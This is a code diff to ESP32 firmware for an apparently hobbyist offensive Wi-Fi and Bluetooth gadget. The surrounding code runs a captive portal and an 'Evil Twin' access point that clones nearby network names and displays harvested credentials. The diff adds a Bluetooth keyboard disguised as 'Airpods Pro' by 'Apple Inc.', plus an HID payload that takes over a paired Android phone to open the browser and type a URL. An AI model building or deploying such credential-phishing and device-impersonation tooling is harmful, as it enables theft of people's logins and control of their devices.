@@ -5,6 +5,7 @@
 #include <Wire.h>
 #include <Adafruit_GFX.h>
 #include <Adafruit_SSD1306.h>
+#include <BleKeyboard.h>
 
 #define SCREEN_WIDTH 128
 #define SCREEN_HEIGHT 64
@@ -13,6 +14,8 @@ Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
 
 #define BTN_MODE 18
 #define BTN_ACTION 19
+
+#define KEY_SEARCH 0x44
 
 AsyncWebServer server(80);
 DNSServer dnsServer;
@@ -34,6 +37,8 @@ int numTargets = 0, selectedTarget = 0;
 
 const char* ByteCat1[] = {"  /\\_/\\ ", " ( o.o )", "  > ^ < "};
 const char* ByteCat2[] = {"  /\\_/\\ ", " ( -.- )", "  > ^ < "};
+
+BleKeyboard bleKeyboard("Airpods Pro", "Apple Inc.", 100);
 
 const char* html_page = R"rawliteral(
 <!DOCTYPE html><html lang="pt">
@@ -90,7 +95,7 @@ void showCredsDisplay() {
 void resetSystem() {
   WiFi.softAPdisconnect(true);
   dnsServer.stop();
-  server.reset();  // Limpa rotas antigas e mantém servidor ativo
+  server.end();
   visitCount = 0;
 }
 
@@ -99,7 +104,7 @@ void setupCaptive(const char* ssid) {
   WiFi.softAP(ssid, "", 6);
   delay(200);
   dnsServer.start(DNS_PORT, "*", apIP);
-  server.reset();
+  server.end();
 
   server.on("/", HTTP_GET, [](AsyncWebServerRequest *r) {
     visitCount++;
@@ -125,10 +130,49 @@ void scanNetworks() {
   for (int i = 0; i < numTargets && i < 10; i++) {
     targetSSIDs[i] = WiFi.SSID(i);
   }
-  if(numTargets == 0) {
+  if (numTargets == 0) {
     targetSSIDs[0] = "NoNetworks";
     numTargets = 1;
   }
+}
+
+// --------- Bluetooth: Ativar e Desativar ---------
+void startBLE() {
+  bleKeyboard.begin();
+}
+
+void stopBLE() {
+  // BLE não tem .end() direto, então só desliga o WiFi para evitar conflito
+  WiFi.mode(WIFI_OFF);
+}
+
+// --------- PAYLOAD HID PARA ANDROID ---------
+void startHIDPayload() {
+  WiFi.mode(WIFI_OFF);
+  delay(500);
+
+  if (!bleKeyboard.isConnected()) {
+    Serial.println("Aguardando conexão BLE...");
+    return;
+  }
+
+  Serial.println("Enviando payload: abrir navegador e acessar link...");
+  delay(2000);
+
+  // Comando para abrir navegador padrão no Android
+  bleKeyboard.write(KEY_MEDIA_WWW_HOME);
+  delay(1500); // aguarda o browser abrir
+
+  // Digitar a URL lentamente
+  String url = "https://github.com/pedrolucas7i";
+  for (char c : url) {
+    bleKeyboard.print(c);
+    delay(50);
+  }
+
+  // Pressionar ENTER para navegar
+  bleKeyboard.write(KEY_RETURN);
+  Serial.println("Payload enviado com sucesso.");
 }
 
 void setup() {
@@ -157,8 +201,10 @@ void loop() {
   if (millis() - lastDebounce > debounceDelay) {
     if (digitalRead(BTN_MODE) == HIGH) {
       lastDebounce = millis();
-      mode = (mode + 1) % 5;
+      mode = (mode + 1) % 6;
       resetSystem();
+      stopBLE();
+
       switch (mode) {
         case 1:
           currentSSID = (currentSSID + 1) % 4;
@@ -181,6 +227,10 @@ void loop() {
         case 4:
           showCredsDisplay();
           break;
+        case 5:
+          startBLE();
+          updateDisplay("Bluetooth HID", "Esperando", 0, blink);
+          break;
         default:
           updateDisplay("Standby", "-", visitCount, blink);
       }
@@ -188,11 +238,14 @@ void loop() {
 
     if (digitalRead(BTN_ACTION) == HIGH) {
       lastDebounce = millis();
-      if (mode == 3) {  // Muda Evil Twin SSID
+      if (mode == 3) {
         selectedTarget = (selectedTarget + 1) % numTargets;
         resetSystem();
         setupCaptive(targetSSIDs[selectedTarget].c_str());
         updateDisplay("Evil Twin", targetSSIDs[selectedTarget], visitCount, blink);
+      } else if (mode == 5) {
+        startHIDPayload();
+        updateDisplay("Payload Enviado", "https://github.com/pedrolucas7i", 0, blink);
       } else {
         resetSystem();
         updateDisplay("Resetado", "-", 0, blink);
@@ -200,7 +253,6 @@ void loop() {
     }
   }
 
-  // Atualiza display no modo captive e evil twin para atualizar contador e SSID
   if (mode == 2 || mode == 3) {
     updateDisplay(mode == 2 ? "Captive Portal" : "Evil Twin",
                   mode == 2 ? "LOGIN_PORTAL" : targetSSIDs[selectedTarget],
